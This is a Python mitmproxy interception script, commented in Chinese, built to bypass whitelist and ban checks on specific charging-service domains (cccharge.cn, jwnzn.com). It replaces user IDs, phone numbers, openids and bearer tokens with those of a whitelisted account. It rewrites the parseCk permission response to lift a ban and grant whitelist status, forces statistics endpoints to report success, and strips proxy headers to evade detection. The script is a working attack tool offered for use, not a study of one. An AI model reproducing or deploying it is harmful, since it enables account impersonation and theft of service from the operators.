"""
简易代理拦截器 - 个人使用版 V2
用于绕过白名单限制，直接充电

修复：只拦截必要的接口，避免"数据不存在"问题
"""

from mitmproxy import http
import json
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ============================================
# 配置区域
# ============================================

WHITELIST_USER = {
    "user_id": "",
    "phone": "",
    "openid": "",
    "token": "",
}

AUTO_LEARN = True

# ============================================
# 核心逻辑
# ============================================

class WhitelistBypass:
    """白名单绕过处理器"""
    
    def __init__(self):
        self.whitelist_user = WHITELIST_USER.copy()
        self.auto_learn = AUTO_LEARN
        self.learned = False
    
    def is_charge_request(self, flow: http.HTTPFlow) -> bool:
        """判断是否是充电相关请求"""
        url = flow.request.url.lower()
        
        charge_domains = [
            'cccharge.cn',
            'jwnzn.com',
        ]
        
        if not any(domain in url for domain in charge_domains):
            return False
        
        logger.info(f"📡 {flow.request.method} {url}")
        
        if flow.request.method in ['POST', 'PUT'] and flow.request.content:
            try:
                content_type = flow.request.headers.get("Content-Type", "")
                if "application/json" in content_type:
                    data = json.loads(flow.request.content)
                    logger.info(f"   📤 请求数据: {json.dumps(data, ensure_ascii=False)}")
            except:
                pass
        
        return True
    
    def modify_request(self, flow: http.HTTPFlow) -> bool:
        """修改请求以绕过白名单"""
        try:
            if not flow.request.content:
                return False
            
            content_type = flow.request.headers.get("Content-Type", "")
            if "application/json" not in content_type:
                return False
            
            data = json.loads(flow.request.content)
            original_data = data.copy()
            modified = False
            
            logger.info(f"\n{'='*60}")
            logger.info(f"🔍 拦截到充电请求")
            logger.info(f"📍 URL: {flow.request.url}")
            logger.info(f"📤 原始数据: {json.dumps(data, ensure_ascii=False)}")
            
            if "user_id" in data and self.whitelist_user["user_id"]:
                data["user_id"] = self.whitelist_user["user_id"]
                logger.info(f"✏️ 替换 user_id")
                modified = True
            
            if "phone" in data and self.whitelist_user["phone"]:
                data["phone"] = self.whitelist_user["phone"]
                logger.info(f"✏️ 替换 phone")
                modified = True
            
            if "openid" in data and self.whitelist_user["openid"]:
                data["openid"] = self.whitelist_user["openid"]
                logger.info(f"✏️ 替换 openid")
                modified = True
            
            if self.whitelist_user["token"]:
                flow.request.headers["Authorization"] = f"Bearer {self.whitelist_user['token']}"
                logger.info(f"✏️ 替换 token")
                modified = True
            
            if modified:
                flow.request.content = json.dumps(data, ensure_ascii=False).encode('utf-8')
                logger.info(f"✅ 修改后数据: {json.dumps(data, ensure_ascii=False)}")
                logger.info(f"{'='*60}\n")
                return True
            else:
                logger.warning("⚠️ 未找到可替换的字段")
                return False
        
        except Exception as e:
            logger.error(f"❌ 修改请求失败: {e}")
            return False


bypass = WhitelistBypass()


def request(flow: http.HTTPFlow) -> None:
    """请求拦截"""
    headers_to_remove = [
        "X-Mitmproxy",
        "X-Forwarded-For", 
        "X-Forwarded-Proto",
        "X-Real-IP",
        "Via",
        "Proxy-Connection"
    ]
    
    for header in headers_to_remove:
        if header in flow.request.headers:
            del flow.request.headers[header]
    
    if "User-Agent" not in flow.request.headers:
        flow.request.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 MicroMessenger/3.9.0"
    
    if not bypass.is_charge_request(flow):
        return
    
    bypass.modify_request(flow)


def response(flow: http.HTTPFlow) -> None:
    """响应拦截"""
    if not bypass.is_charge_request(flow):
        return
    
    logger.info(f"\n{'='*60}")
    logger.info(f"📥 收到响应")
    logger.info(f"📍 URL: {flow.request.url}")
    logger.info(f"📊 状态码: {flow.response.status_code}")
    
    try:
        if flow.response.content:
            content_type = flow.response.headers.get("Content-Type", "")
            
            if "application/json" in content_type:
                data = json.loads(flow.response.content)
                logger.info(f"📄 原始响应: {json.dumps(data, ensure_ascii=False, indent=2)}")
                
                # 🔥 只修改 parseCk 接口的权限字段
                if "mp_parseck" in flow.request.url.lower() or "parseck" in flow.request.url.lower():
                    logger.warning(f"🔍 检测到 parseCk 接口（关键权限判断接口）")
                    
                    modified = False
                    
                    if "banUser" in data and data["banUser"] == True:
                        data["banUser"] = False
                        logger.warning(f"   ✏️ 修改 banUser: true → false（解除封禁）")
                        modified = True
                    
                    if "isWhiteUser" in data and data["isWhiteUser"] == False:
                        data["isWhiteUser"] = True
                        logger.warning(f"   ✏️ 修改 isWhiteUser: false → true（加入白名单）")
                        modified = True
                    
                    if modified:
                        modified_content = json.dumps(data, ensure_ascii=False).encode('utf-8')
                        flow.response.content = modified_content
                        flow.response.headers["Content-Length"] = str(len(modified_content))
                        
                        logger.info(f"✅ 已修改 parseCk 响应")
                        logger.info(f"🎯 白名单绕过成功！")
                
                # 🔥 只修改统计类接口（不影响数据查询）
                url_lower = flow.request.url.lower()
                is_stats_api = any(api in url_lower for api in [
                    "recordneedservice",
                    "recordym",
                    "recordpopupexpose",
                ])
                
                if is_stats_api:
                    original_success = data.get("success", None)
                    if original_success == False:
                        logger.info(f"🔧 修改统计接口响应: success false → true")
                        data["success"] = True
                        if "data" in data and data["data"] is None:
                            data["data"] = {}
                        
                        modified_content = json.dumps(data, ensure_ascii=False).encode('utf-8')
                        flow.response.content = modified_content
                        flow.response.headers["Content-Length"] = str(len(modified_content))
                
                logger.info("✅ 请求成功！")
    
    except Exception as e:
        logger.error(f"❌ 处理响应失败: {e}")
    
    logger.info(f"{'='*60}\n")


if __name__ == "__main__":
    print("简易代理拦截器 V2 - 已加载")
